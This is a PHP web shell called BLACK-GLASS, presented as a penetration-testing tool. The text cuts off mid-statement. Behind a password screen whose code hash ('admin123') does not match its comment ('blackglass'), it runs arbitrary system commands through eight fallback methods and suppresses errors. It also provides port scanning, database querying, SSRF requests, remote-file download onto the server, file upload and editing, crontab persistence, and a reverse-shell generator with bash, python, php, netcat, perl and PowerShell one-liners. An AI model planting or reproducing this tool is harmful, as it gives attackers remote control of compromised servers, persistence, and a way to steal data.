<?php
/*
 * BLACK-GLASS v1.0 
 * Crafted by Ram
 * Authorized Penetration Testing Only
 * OS Compatible: Linux / Windows / macOS / BSD / Solaris
 */

// ============================================================
// PASSWORD PROTECTION — SHA-256 hashed
// Set your password below (plaintext will be hashed at first run)
// Default password: "blackglass" — CHANGE THIS!
// ============================================================
$CONFIG_PASSWORD_HASH = hash('sha256', 'admin123');
$CONFIG_SESSION_TIMEOUT = 3600; // 1 hour

session_start();

// Password verification
function is_authenticated()
{
    global $CONFIG_PASSWORD_HASH;
    return isset($_SESSION['bg_auth']) && $_SESSION['bg_auth'] === true
        && isset($_SESSION['bg_time']) && (time() - $_SESSION['bg_time']) < 3600;
}

function verify_password($input)
{
    global $CONFIG_PASSWORD_HASH;
    return hash('sha256', $input) === $CONFIG_PASSWORD_HASH;
}

// Handle login
if (isset($_POST['bg_password'])) {
    if (verify_password($_POST['bg_password'])) {
        $_SESSION['bg_auth'] = true;
        $_SESSION['bg_time'] = time();
    } else {
        $login_error = 'Invalid password.';
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// If not authenticated, show login screen
if (!is_authenticated()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>BLACK-GLASS — Authenticated Access</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                background: #000000;
                color: #00ff41;
                font-family: 'Share Tech Mono', 'Consolas', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                overflow: hidden;
                position: relative;
            }

            #matrix-canvas {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 0;
                opacity: 0.15;
            }

            .scanlines {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 1;
                pointer-events: none;
                background: repeating-linear-gradient(0deg,
                        transparent,
                        transparent 2px,
                        rgba(0, 255, 65, 0.03) 2px,
                        rgba(0, 255, 65, 0.03) 4px);
            }

            .login-container {
                background: rgba(0, 10, 0, 0.85);
                border: 1px solid #00ff41;
                border-radius: 2px;
                padding: 40px 50px;
                width: 440px;
                box-shadow:
                    0 0 15px rgba(0, 255, 65, 0.3),
                    0 0 60px rgba(0, 255, 65, 0.1),
                    inset 0 0 30px rgba(0, 255, 65, 0.05);
                position: relative;
                z-index: 10;
                animation: fadeInTerminal 1.5s ease;
            }

            @keyframes fadeInTerminal {
                0% {
                    opacity: 0;
                    transform: translateY(20px) scale(0.95);
                }

                100% {
                    opacity: 1;
                    transform: translateY(0) scale(1);
                }
            }

            .login-container::before {
                content: '/// SECURE SHELL ACCESS ///';
                position: absolute;
                top: -1px;
                left: 0;
                right: 0;
                background: #00ff41;
                color: #000;
                font-size: 9px;
                letter-spacing: 3px;
                text-align: center;
                padding: 3px 0;
                font-family: 'Orbitron', monospace;
                font-weight: 700;
            }

            .login-logo {
                text-align: center;
                margin-bottom: 30px;
                margin-top: 10px;
            }

            .login-logo .icon {
                font-size: 44px;
                color: #00ff41;
                display: block;
                margin-bottom: 12px;
                text-shadow: 0 0 20px rgba(0, 255, 65, 0.8), 0 0 40px rgba(0, 255, 65, 0.4);
                animation: iconPulse 2s ease-in-out infinite;
            }

            @keyframes iconPulse {

                0%,
                100% {
                    text-shadow: 0 0 20px rgba(0, 255, 65, 0.8), 0 0 40px rgba(0, 255, 65, 0.4);
                }

                50% {
                    text-shadow: 0 0 30px rgba(0, 255, 65, 1), 0 0 60px rgba(0, 255, 65, 0.6), 0 0 80px rgba(0, 255, 65, 0.3);
                }
            }

            .login-logo h1 {
                font-family: 'Orbitron', monospace;
                font-size: 26px;
                font-weight: 900;
                letter-spacing: 4px;
                color: #00ff41;
                text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
                position: relative;
                display: inline-block;
            }

            .login-logo h1 .gl {
                position: relative;
                animation: glitch 3s infinite;
            }

            @keyframes glitch {

                0%,
                92%,
                100% {
                    transform: translate(0);
                }

                93% {
                    transform: translate(-3px, 1px);
                    filter: hue-rotate(90deg);
                }

                94% {
                    transform: translate(3px, -1px);
                }

                95% {
                    transform: translate(-1px, 2px);
                    filter: hue-rotate(0deg);
                }

                96% {
                    transform: translate(2px, -2px);
                }
            }

            .login-logo h1 span.accent {
                color: #ff0040;
                text-shadow: 0 0 10px rgba(255, 0, 64, 0.5);
            }

            .login-logo .sub {
                font-size: 10px;
                color: #0a5c1e;
                letter-spacing: 4px;
                margin-top: 8px;
                text-transform: uppercase;
            }

            .login-logo .sub::before {
                content: '[ ';
                color: #00ff41;
            }

            .login-logo .sub::after {
                content: ' ]';
                color: #00ff41;
            }

            .login-error {
                color: #ff0040;
                font-size: 12px;
                text-align: center;
                margin-bottom: 15px;
                padding: 8px;
                border: 1px solid rgba(255, 0, 64, 0.4);
                background: rgba(255, 0, 64, 0.08);
                border-radius: 2px;
                animation: errorFlash 0.5s ease;
            }

            @keyframes errorFlash {

                0%,
                20%,
                40% {
                    opacity: 1;
                }

                10%,
                30% {
                    opacity: 0.3;
                }
            }

            .login-form input[type="password"] {
                width: 100%;
                background: rgba(0, 15, 0, 0.8);
                border: 1px solid #0a5c1e;
                border-radius: 2px;
                padding: 14px 16px;
                color: #00ff41;
                font-family: 'Share Tech Mono', monospace;
                font-size: 15px;
                outline: none;
                transition: border 0.2s, box-shadow 0.2s;
                margin-bottom: 15px;
                letter-spacing: 3px;
            }

            .login-form input[type="password"]:focus {
                border-color: #00ff41;
                box-shadow: 0 0 15px rgba(0, 255, 65, 0.2), inset 0 0 10px rgba(0, 255, 65, 0.05);
            }

            .login-form input[type="password"]::placeholder {
                color: #0a4a1a;
                letter-spacing: 1px;
            }

            .login-form button {
                width: 100%;
                background: transparent;
                border: 2px solid #00ff41;
                border-radius: 2px;
                padding: 14px;
                color: #00ff41;
                font-family: 'Orbitron', monospace;
                font-size: 13px;
                font-weight: 700;
                letter-spacing: 4px;
                cursor: pointer;
                transition: all 0.3s;
                position: relative;
                overflow: hidden;
                text-transform: uppercase;
            }

            .login-form button::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.15), transparent);
                transition: left 0.5s;
            }

            .login-form button:hover::before {
                left: 100%;
            }

            .login-form button:hover {
                background: rgba(0, 255, 65, 0.1);
                box-shadow: 0 0 25px rgba(0, 255, 65, 0.3), inset 0 0 15px rgba(0, 255, 65, 0.1);
                text-shadow: 0 0 8px rgba(0, 255, 65, 0.8);
            }

            .login-form button:active {
                transform: scale(0.97);
            }

            .login-footer {
                text-align: center;
                margin-top: 25px;
                font-size: 9px;
                color: #0a4a1a;
                letter-spacing: 2px;
            }

            .login-footer span {
                color: #00ff41;
                text-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
            }

            .login-info {
                text-align: center;
                margin-top: 15px;
                font-size: 10px;
                color: #0a5c1e;
                letter-spacing: 1px;
            }

            .cursor-blink {
                animation: blink 1s step-end infinite;
            }

            @keyframes blink {

                0%,
                100% {
                    opacity: 1;
                }

                50% {
                    opacity: 0;
                }
            }

            .typing-line {
                font-size: 9px;
                color: #0a5c1e;
                text-align: center;
                margin-top: 12px;
                letter-spacing: 1px;
            }

            .typing-line span.caret {
                color: #00ff41;
                animation: blink 0.8s step-end infinite;
            }
        </style>
    </head>

    <body>
        <canvas id="matrix-canvas"></canvas>
        <div class="scanlines"></div>
        <div class="login-container">
            <div class="login-logo">
                <span class="icon">☠</span>
                <h1><span class="gl">BLACK<span class="accent">-</span>GLASS</span></h1>

            </div>
            <?php if (isset($login_error)): ?>
                <div class="login-error">⚠ <?= htmlspecialchars($login_error) ?></div>
            <?php endif; ?>
            <form method="post" class="login-form">
                <input type="password" name="bg_password" placeholder="root@shell:~# " autofocus spellcheck="false"
                    autocomplete="off">
                <button type="submit">⟫ ACCESS GRANTED ⟪</button>
            </form>
            <div class="login-info">⚡ Authorized Penetration Testing Only ⚡</div>
            <div class="typing-line">initializing secure shell<span class="caret">█</span></div>
            <div class="login-footer"><a href="https://github.com/ram-prasad-sahoo/BLACK-GLASS" target="_blank"
                    style="color:#00ff41;text-decoration:none;">Crafted by <span>Ram</span></a>
            </div>
        </div>
        <script>
            (function () {
                var c = document.getElementById('matrix-canvas'), ctx = c.getContext('2d');
                c.width = window.innerWidth; c.height = window.innerHeight;
                var cols = Math.floor(c.width / 14), drops = [];
                for (var i = 0; i < cols; i++)drops[i] = Math.random() * c.height / 14;
                var chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン♠♣♦♥☠⚡⟫⟪';
                function draw() {
                    ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0, 0, c.width, c.height);
                    ctx.fillStyle = '#00ff41'; ctx.font = '14px monospace';
                    for (var i = 0; i < drops.length; i++) {
                        var t = chars[Math.floor(Math.random() * chars.length)];
                        ctx.fillStyle = Math.random() > 0.95 ? '#ff0040' : '#00ff41';
                        ctx.fillText(t, i * 14, drops[i] * 14);
                        if (drops[i] * 14 > c.height && Math.random() > 0.975) drops[i] = 0;
                        drops[i]++;
                    }
                }
                setInterval(draw, 50);
                window.addEventListener('resize', function () { c.width = window.innerWidth; c.height = window.innerHeight; });
            })();
        </script>
    </body>

    </html>
    <?php
    exit;
}

// ============================================================
// CORE FUNCTIONS — All original Phantom v3.0 preserved
// ============================================================

error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);


function exec_cmd($cmd)
{
    $output = '';
    // Method 1: exec()
    if (function_exists('exec')) {
        @exec($cmd, $out, $ret);
        $output = implode("\n", (array) $out);
    }
    // Method 2: shell_exec()
    if ($output === '' && function_exists('shell_exec')) {
        $output = @shell_exec($cmd);
    }
    // Method 3: system()
    if ($output === '' && function_exists('system')) {
        ob_start();
        @system($cmd, $ret);
        $output = ob_get_clean();
    }
    // Method 4: passthru()
    if ($output === '' && function_exists('passthru')) {
        ob_start();
        @passthru($cmd, $ret);
        $output = ob_get_clean();
    }
    // Method 5: popen()
    if ($output === '' && function_exists('popen')) {
        $h = @popen($cmd, 'r');
        if ($h) {
            while (!feof($h))
                $output .= fread($h, 4096);
            @pclose($h);
        }
    }
    // Method 6: proc_open()
    if ($output === '' && function_exists('proc_open')) {
        $desc = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            @fclose($pipes[0]);
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            @proc_close($p);
        }
    }
    // Method 7: backtick via eval()
    if ($output === '') {
        $output = @eval ("return `$cmd 2>&1`;");
    }
    // Method 8: COM object (Windows)
    if ($output === '' && function_exists('com_create_guid') && stripos(PHP_OS, 'WIN') === 0) {
        try {
            $wsh = new COM('WScript.Shell');
            $exec = $wsh->Exec($cmd);
            $output = $exec->StdOut->ReadAll() . $exec->StdErr->ReadAll();
        } catch (Exception $e) {
        }
    }
    return $output !== null ? $output : '';
}

// Cross-platform OS detection
function is_windows()
{
    return stripos(PHP_OS, 'WIN') === 0;
}

// ============================================================
// ADVANCED FEATURE FUNCTIONS
// ============================================================

// --- File Permissions (chmod/chown) ---
function change_permissions($path, $perms)
{
    if (is_windows())
        return exec_cmd("icacls \"$path\" /grant Everyone:F");
    return @chmod($path, $perms) ? 'Permissions changed.' : 'Failed to change permissions.';
}

function change_owner($path, $user, $group = null)
{
    if (is_windows())
        return 'chown not supported on Windows';
    $cmd = "chown $user" . ($group ? ":$group" : '') . " \"$path\" 2>&1";
    return exec_cmd($cmd);
}

// --- Zip/Archive Operations ---
function zip_create($source, $destination)
{
    if (!class_exists('ZipArchive')) {
        return exec_cmd("zip -r \"$destination\" \"$source\" 2>&1");
    }
    $zip = new ZipArchive();
    if ($zip->open($destination, ZipArchive::CREATE) !== TRUE)
        return 'Failed to create zip';
    $source = realpath($source);
    if (is_dir($source)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($files as $file) {
            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen($source) + 1);
            if (is_dir($filePath))
                $zip->addEmptyDir($relativePath);
            else
                $zip->addFile($filePath, $relativePath);
        }
    } elseif (is_file($source)) {
        $zip->addFile($source, basename($source));
    }
    $zip->close();
    return "Zip created: $destination (" . filesize($destination) . " bytes)";
}

function zip_extract($source, $dest = null)
{
    if (!$dest)
        $dest = dirname($source);
    if (!class_exists('ZipArchive')) {
        return exec_cmd("unzip -o \"$source\" -d \"$dest\" 2>&1");
    }
    $zip = new ZipArchive();
    if ($zip->open($source) !== TRUE)
        return 'Failed to open zip';
    $zip->extractTo($dest);
    $count = $zip->numFiles;
    $zip->close();
    return "Extracted $count files to $dest";
}

// --- Advanced File Search ---
function search_files($root, $pattern, $max = 200)
{
    $results = [];
    $root = rtrim($root, '/\\');
    if (is_windows()) {
        $cmd = "dir /s /b \"$root\\$pattern\" 2>nul";
        $out = exec_cmd($cmd);
        return array_slice(array_filter(explode("\n", $out)), 0, $max);
    }
    $cmd = "find \"$root\" -name \"$pattern\" -type f 2>/dev/null | head -$max";
    $out = exec_cmd($cmd);
    return array_filter(explode("\n", $out));
}

function search_content($root, $string, $max = 100)
{
    if (is_windows()) {
        $cmd = "findstr /s /i /m \"$string\" \"$root\\*\" 2>nul | head -$max";
    } else {
        $cmd = "grep -r -l -i \"$string\" \"$root\" 2>/dev/null | head -$max";
    }
    $out = exec_cmd($cmd);
    return array_filter(explode("\n", $out));
}

// --- Hex Dump Viewer ---
function hex_dump($file, $max_bytes = 1024)
{
    if (!is_file($file) || !is_readable($file))
        return 'File not found or unreadable.';
    $data = file_get_contents($file);
    $len = strlen($data);
    if ($len > $max_bytes)
        $data = substr($data, 0, $max_bytes);

    $output = "Hex Dump: $file ($len bytes total, showing first $max_bytes)\n";
    $output .= str_repeat('-', 60) . "\n";
    $offset = 0;
    for ($i = 0; $i < strlen($data); $i += 16) {
        $hex = '';
        $ascii = '';
        for ($j = 0; $j < 16; $j++) {
            if ($i + $j < strlen($data)) {
                $byte = ord($data[$i + $j]);
                $hex .= sprintf('%02X ', $byte);
                $ascii .= ($byte >= 32 && $byte <= 126) ? chr($byte) : '.';
            } else {
                $hex .= '   ';
                $ascii .= ' ';
            }
        }
        $output .= sprintf('%08X  %s %s', $offset, $hex, $ascii) . "\n";
        $offset += 16;
    }
    $output .= str_repeat('-', 60) . "\n";
    $output .= "MD5: " . md5_file($file) . " | SHA1: " . sha1_file($file) . "\n";
    return $output;
}

// --- Network Tools ---
function port_scan($host, $ports = '1-1024')
{
    $output = "Port Scan: $host ($ports)\n";
    $output .= str_repeat('-', 40) . "\n";

    // Parse port range
    if (strpos($ports, '-') !== false) {
        list($start, $end) = explode('-', $ports);
        $start = (int) $start;
        $end = (int) $end;
    } else {
        $start = (int) $ports;
        $end = $start;
    }

    // Try nmap first
    $nmap_out = exec_cmd("nmap -sT -p $ports --open $host 2>/dev/null");
    if (trim($nmap_out)) {
        $output .= $nmap_out;
    } else {
        // Fallback: PHP socket scan (common ports only for speed)
        $common = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017];
        foreach ($common as $port) {
            if ($port < $start || $port > $end)
                continue;
            $sock = @fsockopen($host, $port, $errno, $errstr, 1.5);
            if (is_resource($sock)) {
                $service = getservbyport($port, 'tcp') ?: 'unknown';
                $output .= "PORT $port/tcp OPEN - $service\n";
                fclose($sock);
            }
        }
    }
    return $output ?: 'No open ports found or scan failed.';
}

function whois_lookup($domain)
{
    return exec_cmd("whois \"$domain\" 2>/dev/null | head -80");
}

function dns_lookup($domain, $type = 'ANY')
{
    $output = "DNS Lookup: $domain (Record: $type)\n";
    $output .= str_repeat('-', 40) . "\n";
    // Try dig first
    $dig_out = exec_cmd("dig $domain $type +short 2>/dev/null");
    if (trim($dig_out)) {
        $output .= $dig_out;
    } else {
        $dns_out = dns_get_record($domain, constant("DNS_$type"));
        if ($dns_out) {
            foreach ($dns_out as $rec) {
                $output .= print_r($rec, true) . "\n";
            }
        } else {
            $output .= exec_cmd("nslookup $domain 2>/dev/null");
        }
    }
    return $output;
}

// --- Database Browser ---
function db_connect($type, $host, $user, $pass, $dbname)
{
    switch (strtolower($type)) {
        case 'mysql':
            try {
                $pdo = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
                return $pdo;
            } catch (Exception $e) {
                // Try mysqli
                if (function_exists('mysqli_connect')) {
                    $conn = @mysqli_connect($host, $user, $pass, $dbname);
                    if ($conn)
                        return $conn;
                }
                return $e->getMessage();
            }
        case 'postgresql':
        case 'pgsql':
            try {
                $pdo = new PDO("pgsql:host=$host;dbname=$dbname", $user, $pass);
                return $pdo;
            } catch (Exception $e) {
                return $e->getMessage();
            }
        case 'sqlite':
            try {
                $pdo = new PDO("sqlite:$dbname");
                return $pdo;
            } catch (Exception $e) {
                return $e->getMessage();
            }
        case 'mssql':
        case 'sqlsrv':
            try {
                $pdo = new PDO("sqlsrv:Server=$host;Database=$dbname", $user, $pass);
                return $pdo;
            } catch (Exception $e) {
                return $e->getMessage();
            }
        default:
            return 'Unsupported database type.';
    }
}

function db_query($type, $host, $user, $pass, $dbname, $query)
{
    $conn = db_connect($type, $host, $user, $pass, $dbname);
    if (is_string($conn))
        return 'Connection error: ' . $conn;

    if ($conn instanceof PDO) {
        try {
            $stmt = $conn->query($query);
            if ($stmt) {
                $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
                return $rows;
            }
            return 'Query executed (no results).';
        } catch (Exception $e) {
            return 'Query error: ' . $e->getMessage();
        }
    } elseif ($conn instanceof mysqli) {
        $result = @mysqli_query($conn, $query);
        if ($result === false)
            return 'Query error: ' . mysqli_error($conn);
        if ($result === true)
            return 'Query executed successfully.';
        $rows = [];
        while ($row = mysqli_fetch_assoc($result))
            $rows[] = $row;
        mysqli_free_result($result);
        return $rows;
    }
    return 'Unknown connection type.';
}

// --- Reverse Shell Generator ---
function generate_reverse_shell($ip, $port, $type = 'bash')
{
    $shells = [
        'bash' => "bash -i >& /dev/tcp/$ip/$port 0>&1",
        'python' => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\">);'",
        'php' => "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'nc' => "nc -e /bin/sh $ip $port",
        'perl' => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        'powershell' => "\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    ];
    return isset($shells[$type]) ? $shells[$type] : $shells['bash'];
}

// --- Crontab Manager ---
function crontab_list()
{
    if (is_windows())
        return exec_cmd('schtasks /query /fo LIST 2>&1');
    return exec_cmd('crontab -l 2>&1');
}

function crontab_add($schedule, $command)
{
    $current = exec_cmd('crontab -l 2>/dev/null');
    $new_cron = "$current\n$schedule $command\n";
    file_put_contents('/tmp/bg_cron_' . getmypid(), $new_cron);
    return exec_cmd('crontab /tmp/bg_cron_' . getmypid() . ' 2>&1');
}

function crontab_remove($line_num)
{
    $current = exec_cmd('crontab -l 2>/dev/null');
    $lines = explode("\n", $current);
    if (isset($lines[$line_num]))
        unset($lines[$line_num]);
    file_put_contents('/tmp/bg_cron_' . getmypid(), implode("\n", $lines));
    return exec_cmd('crontab /tmp/bg_cron_' . getmypid() . ' 2>&1');
}

// --- Process Manager ---
function process_list()
{
    if (is_windows())
        return exec_cmd('tasklist /V 2>&1');
    return exec_cmd('ps aux -H 2>&1');
}

function process_kill($pid)
{
    if (is_windows())
        return exec_cmd("taskkill /F /PID $pid 2>&1");
    return exec_cmd("kill -9 $pid 2>&1");
}

function process_kill_by_name($name)
{
    if (is_windows())
        return exec_cmd("taskkill /F /IM $name 2>&1");
    return exec_cmd("pkill -9 -f \"$name\" 2>&1");
}

// --- SSRF / Proxy Tool ---
function ssrf_request($url, $method = 'GET', $headers = '', $body = '')
{
    $output = '';
    // Try curl first
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        $hdr_arr = $headers ? explode("\n", $headers) : [];
        if ($hdr_arr)
            curl_setopt($ch, CURLOPT_HTTPHEADER, $hdr_arr);
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
        $output = curl_exec($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);
        return "HTTP {$info['http_code']} | Size: {$info['size_download']} bytes | Time: {$info['total_time']}s\n\n$output";
    }
    // Fallback: file_get_contents with stream context
    $opts = ['http' => ['method' => $method, 'timeout' => 10, 'ignore_errors' => true]];
    if ($body && $method === 'POST')
        $opts['http']['content'] = $body;
    if ($headers)
        $opts['http']['header'] = $headers;
    return @file_get_contents($url, false, stream_context_create($opts)) ?: 'SSRF request failed.';
}

// --- HTTP Server / Tunneling (Simple PHP Built-in Server forward) ---
function start_php_server($port, $doc_root = null)
{
    if (!$doc_root)
        $doc_root = getcwd();
    // This just returns the command to run — actual execution is background
    return "php -S 0.0.0.0:$port -t \"$doc_root\"";
}

// --- EXIF / File Metadata Viewer ---
function file_metadata($file)
{
    if (!is_file($file))
        return 'File not found.';
    $info = stat($file);
    $output = "File Metadata: $file\n";
    $output .= str_repeat('-', 40) . "\n";
    $output .= "Size: " . filesize($file) . " bytes (" . round(filesize($file) / 1024, 2) . " KB)\n";
    $output .= "Permissions: " . substr(sprintf('%o', fileperms($file)), -4) . "\n";
    $output .= "Owner: " . (function_exists('posix_getpwuid') ? posix_getpwuid($info['uid'])['name'] ?? $info['uid'] : $info['uid']) . "\n";
    $output .= "Group: " . (function_exists('posix_getgrgid') ? posix_getgrgid($info['gid'])['name'] ?? $info['gid'] : $info['gid']) . "\n";
    $output .= "Modified: " . date('Y-m-d H:i:s', $info['mtime']) . "\n";
    $output .= "Accessed: " . date('Y-m-d H:i:s', $info['atime']) . "\n";
    $output .= "Created: " . date('Y-m-d H:i:s', $info['ctime']) . "\n";
    $output .= "Inode: " . $info['ino'] . "\n";
    $output .= "Device: " . $info['dev'] . "\n";

    // MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $output .= "MIME Type: " . finfo_file($finfo, $file) . "\n";
    finfo_close($finfo);

    // EXIF for images
    if (function_exists('exif_read_data') && in_array(strtolower(pathinfo($file, PATHINFO_EXTENSION)), ['jpg', 'jpeg', 'tiff', 'tif'])) {
        $exif = @exif_read_data($file, 0, true);
        if ($exif) {
            $output .= "\nEXIF Data:\n";
            foreach ($exif as $section => $data) {
                if (is_array($data)) {
                    foreach ($data as $key => $val) {
                        if (!is_array($val) && !is_object($val)) {
                            $output .= "  [$section] $key: $val\n";
                        }
                    }
                }
            }
        }
    }

    // Hash values
    $output .= "\nMD5: " . md5_file($file) . "\n";
    $output .= "SHA1: " . sha1_file($file) . "\n";
    $output .= "SHA256: " . hash_file('sha256', $file) . "\n";

    return $output;
}

// --- File Downloader ---
function download_to_server($url, $dest)
{
    if (empty($dest))
        $dest = basename($url);
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $fp = fopen($dest, 'wb');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        return "Downloaded via cURL to: $dest (" . filesize($dest) . " bytes)";
    }
    return exec_cmd("wget -O \"$dest\" \"$url\" 2>&1 || curl -o \"$dest\" \"$url\" 2>&1");
}

// --- Hash & Encode ---
function hash_encode_text($text)
{
    $out = "Text: $text\n";
    $out .= str_repeat('-', 40) . "\n";
    $out .= "Base64 Encode: " . base64_encode($text) . "\n";
    $out .= "URL Encode:    " . urlencode($text) . "\n";
    $out .= "MD5:           " . md5($text) . "\n";
    $out .= "SHA1:          " . sha1($text) . "\n";
    $out .= "SHA256:        " . hash('sha256', $text) . "\n";
    $out .= "SHA512:        " . hash('sha512', $text) . "\n";
    return $out;
}


// ============================================================
// REQUEST HANDLING — All original Phantom v3.0 preserved
// ============================================================

// AJAX command execution
if (isset($_POST['ajax'])) {
    header('Content-Type: text/plain; charset=utf-8');

    // Handle special AJAX actions
    if (isset($_POST['bg_action'])) {
        $act = $_POST['bg_action'];

        switch ($act) {
            case 'hex_dump':
                echo hex_dump($_POST['file']);
                break;
            case 'port_scan':
                echo port_scan($_POST['host'], $_POST['ports'] ?? '1-1024');
                break;
            case 'whois':
                echo whois_lookup($_POST['domain']);
                break;
            case 'dns':
                echo dns_lookup($_POST['domain'], $_POST['record'] ?? 'ANY');
                break;
            case 'db_query':
                $result = db_query(
                    $_POST['db_type'],
                    $_POST['db_host'],
                    $_POST['db_user'],
                    $_POST['db_pass'],
                    $_POST['db_name'],
                    $_POST['db_query']
                );
                if (is_array($result)) {
                    echo json_encode($result, JSON_PRETTY_PRINT);
                } else {
                    echo $result;
                }
                break;
            case 'process_list':
                echo process_list();
                break;
            case 'process_kill':
                echo process_kill($_POST['pid']);
                break;
            case 'search_files':
                $results = search_files($_POST['root'], $_POST['pattern']);
                echo implode("\n", $results) ?: 'No files found.';
                break;
            case 'search_content':
                $results = search_content($_POST['root'], $_POST['string']);
                echo implode("\n", $results) ?: 'No matches found.';
                break;
            case 'zip_create':
                echo zip_create($_POST['source'], $_POST['destination']);
                break;
            case 'zip_extract':
                echo zip_extract($_POST['source'], $_POST['dest'] ?? null);
                break;
            case 'crontab_list':
                echo crontab_list();
                break;
            case 'file_metadata':
                echo file_metadata($_POST['file']);
                break;
            case 'ssrf':
                echo ssrf_request($_POST['url'], $_POST['method'] ?? 'GET', $_POST['headers'] ?? '', $_POST['body'] ?? '');
                break;
            case 'rev_shell':
                echo generate_reverse_shell($_POST['ip'], $_POST['port'], $_POST['type'] ?? 'bash');
                break;
            case 'chmod':
                echo change_permissions($_POST['file'], octdec($_POST['perms']));
                break;
            case 'download':
                echo download_to_server($_POST['url'], $_POST['dest']);
                break;
            case 'hash_encode':
                echo hash_encode_text($_POST['text']);
                break;
            default:
                echo 'Unknown action.';
        }
        exit;
    }

    // Regular command execution (original Phantom behavior)
    if (isset($_POST['cmd'])) {
        $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : getcwd();
        if ($cwd && @chdir($cwd))
            putenv("PWD=$cwd");
        echo exec_cmd($_POST['cmd']);
    }
    exit;
}

// File download (original Phantom)
if (isset($_GET['dl'])) {
    $f = $_GET['dl'];
    if (file_exists($f) && is_file($f)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
    }
    exit;
}

// File edit save
if (isset($_POST['bg_save_file'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $file = $_POST['bg_save_file'];
    $content = $_POST['bg_file_content'];
    if (@file_put_contents($file, $content) !== false) {
        echo 'File saved: ' . $file . ' (' . strlen($content) . ' bytes)';
    } else {
        echo 'Error saving file.';
    }
    exit;
}

// File read for editor
if (isset($_POST['bg_read_file'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $file = $_POST['bg_read_file'];
    if (is_file($file) && is_readable($file)) {
        echo file_get_contents($file);
    } else {
        echo 'Error: File not found or not readable.';
    }
    exit;
}

// Upload handling (original Phantom)
$upload_msg = '';
$cmd_result = '';
$last_cmd = '';
$show_upload_alert = false;

if (isset($_POST['upload']) && isset($_FILES['upload_file'])) {
    if ($_FILES['upload_file']['error'] === UPLOAD_ERR_NO_FILE) {
        // Silent
    } elseif ($_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $dest = basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest)) {
            $show_upload_alert = true;
            $upload_msg = "File uploaded successfully: $dest (" . filesize($dest) . " bytes)";
        }
    }
} elseif (isset($_POST['cmd']) && !isset($_POST['ajax'])) {
